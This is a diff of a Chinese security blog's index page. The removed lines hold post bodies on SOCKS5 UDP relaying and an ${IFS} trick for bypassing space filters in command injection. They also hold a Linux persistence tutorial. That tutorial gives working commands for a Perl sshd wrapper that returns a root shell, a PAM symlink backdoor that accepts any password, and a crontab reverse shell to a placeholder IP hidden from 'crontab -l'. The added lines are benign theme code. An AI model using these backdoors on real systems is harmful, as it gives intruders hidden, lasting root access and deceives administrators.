-<p>首先agent需要在接收到client发来的UDP Associate请求后，现在自身机器上打开一个UDP Listener，之后向admin提交启动UDP Associate的消息，admin在收到此消息后也在本地打开一个UDP listener，并且回复agent，告知自身listener的详细信息，agent在收到此消息后，将此详细信息中包含的listener地址+端口以标准的socks5响应回复给client。此时client就可以向admin的此listener发送数据了，admin会将这些数据打包后发送给对应的agent，agent解析并保存要点三中的标头，将数据包发送给对应IP+port。agent在收到相关udp包的回复包后，查找存储的标头，用此标头重新封装回复包，打包返回给admin，admin在收到此数据包后，查找对应的UDP Listener，将数据包由对应的UDP Listener发送给client，从而完成通讯</p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实际上UDP Associate在实际应用中非常小众，一方面是应用场景不够多，另一方面就是性能也不够好(一个UDP Associate需要消耗一个UDP Listener和一个TCP Conn)，还有就是对于client要求也比较高，要求client自身拥有处理丢包重传的能力，socks5服务器是不管理丢包重传方面的问题的。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/24/Socks5-UDP/" data-id="ckhx99669000far5ye1s17qlb" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/" rel="tag">code</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Hackerone-Knowledege" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/17/Hackerone-Knowledege/" class="article-date">
-  <time datetime="2020-06-17T06:20:20.000Z" itemprop="datePublished">2020-06-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/">赏金猎人</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/17/Hackerone-Knowledege/">Hackerone-Knowledege</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li>当一个命令执行漏洞过滤了空格符号且后端服务器为linux时，可以利用<code>$&#123;IFS&#125;</code>这个特殊的内置变量来绕过，此变量是bash中默认的域分隔符。其默认值是空格，tab, 和新行(即” \r\n”，其中” \r\n”任意一个值都代表”空白”)。并且当遇到需要分割字符串的场景时，多个连续的空白将会被压缩为一个空白（经测试，压缩为了空格），故而可以用来代替空格使用。</li>
-</ul>
-<p>还有一些别的方法，例如：</p>
-<p>ls$IFS-la<br>ls$IFS$100-la</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/17/Hackerone-Knowledege/" data-id="ckhx9965z0001ar5yeefmb8ub" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bug-bounty/" rel="tag">bug bounty</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Linux-backdoors" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/04/Linux-backdoors/" class="article-date">
-  <time datetime="2020-06-04T04:03:49.000Z" itemprop="datePublished">2020-06-04</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/04/Linux-backdoors/">Linux后门权限维持</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="sshd后门"><a href="#sshd后门" class="headerlink" title="sshd后门"></a>sshd后门</h2><p>sshd后门应该是比较老的一种后门维持方式了，简单来说需要的条件是目标机上需要装有perl环境以及root权限</p>
-<p>在获取root权限后，首先<code>cp /usr/sbin/sshd /usr/bin/sshd</code>保存一份真的sshd文件</p>
-<p>之后在sbin目录下新建一个sshd文件，并在里面写入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl</span><br><span class="line">exec&quot;&#x2F;bin&#x2F;sh&quot;if(getpeername(STDIN)&#x3D;~&#x2F;^..zf&#x2F;);</span><br><span class="line">exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125;&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV;</span><br></pre></td></tr></table></figure>
-
-<p>代码的解释:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一行， 如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（Big 网络字节序中的16进制字符串为\x00\x00zf， 正好匹配上perl正则 ..zf，上述代码中的zf是Big 网络字节序的Ascii表示形式），则执行&#x2F;bin&#x2F;sh，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell （因为sshd 是以root权限运行的）给远程socket  （一般只有攻击者指定连接的源端口才能触发这一行的执行）</span><br><span class="line"></span><br><span class="line">第二行  启动sshd (&#x2F;usr&#x2F;bin&#x2F;sshd是真正的sshd)服务 ，凡是传递给&#x2F;usr&#x2F;sbin&#x2F;sshd (后门)的参数都传递给真正的sshd （这一行保证了普通用户也可以正常使用ssh 服务，登录并不会有什么异常现象）</span><br></pre></td></tr></table></figure>
-<p>之后保存文件，并<code>chmod +x sshd</code></p>
-<p>重启sshd服务<code>service sshd restart</code></p>
-<p>之后想要连接时只需要使用socat，执行以下语句即可:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.0.7:22,sourceport&#x3D;31334</span><br></pre></td></tr></table></figure>
-
-<p>语句代表的意思为在本机的标准输入输出与远端的192.168.0.7:22建立pipe以此来传输数据</p>
-<p>而在连接建立的时候，目标机会首先启动sshd来处理连接，此时由于标准输入还未被重定向至socat建立的socket，故而此时脚本第一句执行失败，直接去执行了真正的sshd文件，然后sshd文件被执行后会fork一个子进程来处理传入的连接，与其他的程序fork子进程不一样，sshd fork子进程后，子进程会再次执行sshd（重点），故而控制权又回到了我们的伪造sshd的手上，而此时此子进程的标准输入输出已经被重定向至socat建立的socket，故而正则表达式匹配正确，目标及执行/bin/sh并返回一个root权限的shell</p>
-<p>如下图：</p>
-<p><img src="/image/Linux_Backdoor/sshd.jpg" alt="sshd"></p>
-<h2 id="ssh-pam任意密码后门"><a href="#ssh-pam任意密码后门" class="headerlink" title="ssh pam任意密码后门"></a>ssh pam任意密码后门</h2><p>同样也是很常见的后门了，基于以下语句实现:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;chsh;&#x2F;tmp&#x2F;chsh -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;chfn;&#x2F;tmp&#x2F;chfn -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;runuser;&#x2F;tmp&#x2F;runuser -oPort&#x3D;1337</span><br></pre></td></tr></table></figure>
-
-<p>在root权限下执行以上语句，就可以输入任意密码登陆任意用户</p>
-<p><img src="/image/Linux_Backdoor/anypass.jpg" alt="anypass"></p>
-<p>这里我随便输入了一个密码，就可以登录root用户</p>
-<p>很奇怪，不是么？那么这是为什么呢？</p>
-<p>首先就是sshd默认支持pam认证登录，而登录时，系统选择的pam文件名将是启动的程序文件名，就比如我们使用<code>/tmp/su</code>来启动sshd，那么在pam认证时，将会使用<code>/etc/pam.d/su</code>来作为认证文件</p>
-<p>此外，在<code>/etc/pam.d/su</code>中，有一句<code>auth sufficient pam_rootok.so</code>，这里要说明一下pam的控制关键字：</p>
-<p><img src="/image/Linux_Backdoor/pam.jpg" alt="pam"></p>
-<p>也就是说，只要<code>pam_rootok.so</code>模块返回true，则pam认证流程将会直接成功</p>
-<p>接着，我们就需要知道如何让<code>pam_rootok.so</code>模块返回true，通过查询相关资料，我们可以知道<code>pam_rootok.so</code>直接判断了当前的uid是否为0</p>
-<p><img src="/image/Linux_Backdoor/how-pam_rootok-work.jpg" alt="how-pam_rootok-work"></p>
-<p>如果你再去看看<code>pam_rootok.so</code>的源码，你会发现它使用了getuid()来判断uid</p>
-<p>而getuid()的解释原文<code>getuid() returns the real userID of the calling process</code></p>
-<p>这下就很清晰了，为何我们能够通过<code>pam_rootok.so</code>的认证，是由于调用这个模块的进程是/usr/sbin/sshd，并且这个进程是以root权限运行的，此时getuid()将返回0，这样就保证了不管输入什么密码，<code>pam_rootok.so</code>都会认证成功，从而向sshd进程返回success，通过认证阶段</p>
-<p>从以上的分析，可以发现实现这样的trick，是需要一些条件的</p>
-<ol>
-<li><code>/etc/ssh/sshd_config</code>中必须为<code>UsePAM yes</code>，即允许pam认证(默认)</li>
-<li>ssh必须允许root用户远程登录(如果不允许root远程登录，也可用其他的已存在用户)</li>
-<li>调用的pam模块必须包含<code>auth sufficient pam_rootok.so</code>，而符合条件的模块除了su，还有chsh，chfn，runuser</li>
-<li>创建的软链接文件的文件名必须是pam模块名，不可随意起名，因为选择模块即是基于文件名选择</li>
-</ol>
-<h2 id="crontab后门"><a href="#crontab后门" class="headerlink" title="crontab后门"></a>crontab后门</h2><p>这个怕是老生常谈了，基本上每一个管理员在意识到中毒后都会执行<code>crontab -l</code>查看一下定时任务</p>
-<p>当然，这里不会只是简单写入定时任务，这没有任何意义</p>
-<p>实际上，我们可以借助一些trick来隐藏<code>crontab -l</code>的输出，从而欺骗管理员</p>
-<p>例如，执行如下语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
-
-<p>此时管理员如果执行<code>crontab -l</code>，将会发现没有任何异常</p>
-<p><img src="/image/Linux_Backdoor/crontab.jpg" alt="crontab"></p>
-<p>可以看到，如果用vim打开对应的计划任务文件，可以清晰看见恶意的任务，但是，当管理员执行<code>crontab -l</code>时，却只能看见<code>no crontab for xxx</code></p>
-<p>那么这是为啥呢？</p>
-<p>原理在于，<code>crontab -l</code>实际上是使用了cat命令，但是cat命令默认将会解析\r，而\r的意思是回到行首，在payload中，我们又用了<code>%100c</code>创建了100个空字符“覆盖”了恶意的payload，所以在<code>crontab -l</code>时，无法看到被“覆盖”的恶意payload，从而达到了隐藏的效果</p>
-<h2 id="各类rootkit"><a href="#各类rootkit" class="headerlink" title="各类rootkit"></a>各类rootkit</h2><p>linux rootkit算是最好用的也最强大的后门，github上有不少大师傅也开源了不少rootkit，我自己也在研究中，想自己写一个rootkit XD</p>
-<p>写完后再添加link hh</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/04/Linux-backdoors/" data-id="ckhx99668000ear5yc21wgz6c" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/">赏金猎人</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/binary/" rel="tag">binary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bug-bounty/" rel="tag">bug bounty</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/binary/" style="font-size: 16.67px;">binary</a> <a href="/tags/bug-bounty/" style="font-size: 10px;">bug bounty</a> <a href="/tags/code/" style="font-size: 16.67px;">code</a> <a href="/tags/pentest/" style="font-size: 20px;">pentest</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/11/13/ret2dl/">ret2dl</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/11/bypass-Canary/">bypass Canary</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/24/ptmalloc/">ptmalloc机制闲扯</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/23/Double-free/">Double free</a>
-          </li>
-        
-          <li>
-            <a href="/2020/09/05/linux-fd/">linux中的pipe与fd</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 ph4ntom<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
-</html>
+<meta name="twitter:image" content="http://yoursite.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2020-11-25 18:56:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/bg1.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ph4ntom's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="site-info"><h1 id="site-title">ph4ntom's blog</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/11/13/ret2dl/" title="ret2dl">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2dl"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/13/ret2dl/" title="ret2dl">ret2dl</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-13T03:45:20.000Z" title="发表于 2020-11-13 11:45:20">2020-11-13</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:32:14.604Z" title="更新于 2020-11-25 18:32:14">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/binary/">binary</a></span></div><div class="content">憋问，问就是来踩坑的(笑)</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/11/11/bypass-Canary/" title="bypass Canary">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bypass Canary"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/11/bypass-Canary/" title="bypass Canary">bypass Canary</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-11T10:19:56.000Z" title="发表于 2020-11-11 18:19:56">2020-11-11</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:29:21.942Z" title="更新于 2020-11-25 18:29:21">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/binary/">binary</a></span></div><div class="content">记录一个bypass canary的题目，以及其延伸出来的一大堆知识和大坑</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/10/24/ptmalloc/" title="ptmalloc机制闲扯">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ptmalloc机制闲扯"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/10/24/ptmalloc/" title="ptmalloc机制闲扯">ptmalloc机制闲扯</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-24T13:40:30.000Z" title="发表于 2020-10-24 21:40:30">2020-10-24</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:31:57.745Z" title="更新于 2020-11-25 18:31:57">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/binary/">binary</a></span></div><div class="content">本篇主要闲扯一下ptmalloc机制中一些需要注意的点</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/10/23/Double-free/" title="Double free">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Double free"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/10/23/Double-free/" title="Double free">Double free</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-23T11:08:20.000Z" title="发表于 2020-10-23 19:08:20">2020-10-23</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:29:55.088Z" title="更新于 2020-11-25 18:29:55">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag 